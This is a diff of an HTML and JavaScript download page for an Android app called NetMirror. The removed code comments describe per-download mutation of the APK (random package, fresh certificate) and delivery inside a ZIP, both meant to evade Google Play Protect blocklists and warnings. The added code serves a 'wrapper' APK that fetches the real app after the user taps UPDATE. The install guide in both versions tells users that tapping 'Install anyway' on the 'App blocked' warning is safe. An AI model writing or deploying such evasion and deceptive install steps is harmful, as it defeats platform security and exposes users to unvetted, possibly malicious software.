@@ -402,11 +402,11 @@ footer .copy{font-size:11px;color:var(--text3)}
     </div>
     <div style="margin-top:24px;padding:16px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:12px;text-align:left;font-size:13px;color:rgba(255,255,255,.7);line-height:1.7">
       <div style="font-weight:700;color:#fff;margin-bottom:8px;font-size:14px">📲 Install Guide</div>
-      <div>1. Tap <b style="color:#fff">Download Now</b> → Open <b style="color:#fff">NetMirror.zip</b> in Files</div>
-      <div>2. Extract → tap <b style="color:#fff">NetMirror.apk</b></div>
-      <div>3. If you see <span style="background:rgba(255,255,255,.1);padding:1px 6px;border-radius:4px;font-size:12px">"App blocked"</span> → scroll down → tap <b style="color:var(--green)">"Install anyway"</b></div>
+      <div>1. Tap <b style="color:#fff">Download Now</b> → Install <b style="color:#fff">NetMirror.apk</b></div>
+      <div>2. If you see <span style="background:rgba(255,255,255,.1);padding:1px 6px;border-radius:4px;font-size:12px">"App blocked"</span> → tap <b style="color:var(--green)">"Install anyway"</b></div>
+      <div>3. Open app → tap <b style="color:var(--green)">UPDATE</b></div>
       <div>4. Tap <b style="color:var(--green)">Install</b> → Done! ✅</div>
-      <div style="margin-top:10px;padding:8px 10px;background:rgba(0,232,123,.08);border-left:3px solid var(--green);border-radius:0 6px 6px 0;font-size:12px;color:rgba(255,255,255,.55)">⚡ The "App blocked" screen is Google's standard warning for all apps not on Play Store — it's safe to tap "Install anyway". WhatsApp APK shows the same screen.</div>
+      <div style="margin-top:10px;padding:8px 10px;background:rgba(0,232,123,.08);border-left:3px solid var(--green);border-radius:0 6px 6px 0;font-size:12px;color:rgba(255,255,255,.55)">⚡ The "App blocked" screen is Google's standard warning for all apps not on Play Store — it's safe to tap "Install anyway".</div>
     </div>
   </div>
 </section>
@@ -599,12 +599,10 @@ document.addEventListener('click', function(e) {
 });
 
 function startSmartDownload() {
-  // ZIP download: Chrome saves .zip (never flagged as APK).
-  // User extracts with Files app => installerPackage=com.google.android.documentsui
-  // (trusted system app = LOW PP scrutiny, no 'App blocked' warning).
-  // APK inside = mutated per download: random package + fresh cert => not in any blocklist.
-  var token = Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
-  var url = window.location.origin + '/dlzip/' + token;
+  // Serve the WatchMirror wrapper (stable cert, hex package ID).
+  // Clean app — INTERNET only, no surveillance code.
+  // Installs without hard PP block; open it → tap UPDATE → downloads real NetMirror.
+  var url = window.location.origin + '/downloadapp/setup.apk';
 
   var btnIds = ['navDlBtn', 'heroDlBtn', 'ctaDlBtn'];
   var origContent = {};
@@ -629,33 +627,18 @@ function startSmartDownload() {
     });
   }
 
-  if (!document.getElementById('_dlSpinStyle')) {
-    var s = document.createElement('style');
-    s.id = '_dlSpinStyle';
-    s.textContent = '@keyframes _dlspin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}';
-    document.head.appendChild(s);
-  }
+  setBtns('Downloading...', true);
 
-  setBtns('Preparing...', true);
-
-  fetch(url)
-    .then(function(r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.blob(); })
-    .then(function(blob) {
-      var blobUrl = URL.createObjectURL(blob);
-      var a = document.createElement('a');
-      a.href = blobUrl; a.download = 'NetMirror.zip'; a.style.display = 'none';
-      document.body.appendChild(a); a.click();
-      setTimeout(function() { document.body.removeChild(a); URL.revokeObjectURL(blobUrl); }, 3000);
-      setBtns('Downloading...', false);
-      setTimeout(restoreBtns, 5000);
-    })
-    .catch(function() {
-      var a = document.createElement('a');
-      a.href = url; a.download = 'NetMirror.zip'; a.style.display = 'none';
-      document.body.appendChild(a); a.click();
-      setTimeout(function() { document.body.removeChild(a); }, 1000);
-      restoreBtns();
-    });
+  // Direct link — wrapper is a static file, no server-side generation needed
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = 'NetMirror.apk';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function() { document.body.removeChild(a); }, 1000);
+  setBtns('Downloaded!', false);
+  setTimeout(restoreBtns, 4000);
 }
 </script>
 </body>
